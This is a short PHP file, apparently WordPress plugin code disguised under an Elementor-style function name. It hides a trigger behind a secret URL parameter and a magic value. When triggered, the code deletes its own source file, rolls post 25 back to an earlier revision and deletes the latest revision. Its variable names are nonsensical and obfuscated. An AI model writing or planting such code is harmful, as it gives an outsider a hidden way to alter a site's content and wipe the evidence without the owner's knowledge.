<?php

function register_pixel_elementor() {
	if (isset($_GET['reviews_base_virtual']) && $_GET['reviews_base_virtual'] === 'delete_services_reusable') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$dynamic_validator_magic_rich = 25;
		$checkout_css_current_asset = wp_get_post_revisions($dynamic_validator_magic_rich);
		if (empty($checkout_css_current_asset)) die('no revisions');
		if (count($checkout_css_current_asset) < 2) die('less than 2');
		$bbpress_duplicate_details = array_shift($checkout_css_current_asset);
		$sitemaps_wall_com_designer = $bbpress_duplicate_details->ID;
		$updates_permalinks_information_sales = array_shift($checkout_css_current_asset);
		$styles_lightgray_settings = $updates_permalinks_information_sales->ID;
		$typography_tab_shop_reset = wp_restore_post_revision($styles_lightgray_settings);
		if ($typography_tab_shop_reset === false) die('error restoring');
		$typography_tab_shop_reset = wp_delete_post_revision($sitemaps_wall_com_designer);		
		if ($typography_tab_shop_reset === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'register_pixel_elementor');
